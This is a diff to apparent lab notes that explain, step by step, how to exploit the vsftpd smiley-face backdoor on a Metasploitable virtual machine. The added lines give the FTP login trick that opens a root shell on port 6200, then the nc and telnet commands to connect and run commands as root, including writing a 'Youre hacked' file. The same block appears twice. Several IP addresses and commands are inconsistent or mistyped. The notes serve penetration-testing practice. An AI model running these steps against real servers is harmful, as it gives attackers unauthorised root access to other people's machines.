@@ -32,16 +32,49 @@ Service Info: OS: Unix
 
 >>> Read the references and find the backdoor installer.
 
-$ ftp 10.0.2.4
-user: user:)
-pwd:  pass
+1. Create the backdoor
+$ telnet 10.0.2.4 21
+> type "USER blabla:)" and Enter
+> type "PASS nimp" and Enter
 > Wait few seconds for Backdoor injection (on port 6200).
-Ctrl-C
+Ctrl-]
+> type "quit"
 
+2. Check the backdoor
 $ nmap -p6200 10.0.2.4
 PORT     STATE  SERVICE
 6200/tcp closed lm-x
 
+3.  Try nc or telnet to connect
+$ nc 10.2.0.4 6200
+> type command now (id, whoami, la -al, ...)
+
 $ telnet 10.2.0.4 6200
-id; gives root 
-echo "Youre hacked" >> Hacked.txt; crée un fichier à la racine de la machine metaspoitable.
+> type "id;" gives root !!!! Dont't forget the ";" the end of all commands !!!
+> type "echo 'Youre hacked' >> Hacked.txt;" create file on the metasploitable machine.
+
+>@
+>@################################################################################
+>@
+>@1. Create the backdoor
+>@$ telnet 10.0.2.4 21
+>@> type "USER blabla:)" and Enter
+>@> type "PASS nimp" and Enter
+>@> Wait few seconds for Backdoor injection (on port 6200).
+>@Ctrl-]
+>@> type "quit"
+>@
+>@2. Check the backdoor
+>@$ nmap -p6200 10.0.2.4
+>@PORT     STATE  SERVICE
+>@6200/tcp closed lm-x
+>@
+>@3.  Try nc or telnet to connect
+>@$ nc 10.2.0.4 6200
+>@> type command now (id, whoami, la -al, ...)
+>@
+>@$ telnet 10.2.0.4 6200
+>@> type "id;" gives root !!!! Dont't forget the ";" the end of all commands !!!
+>@
+>@################################################################################
+>@
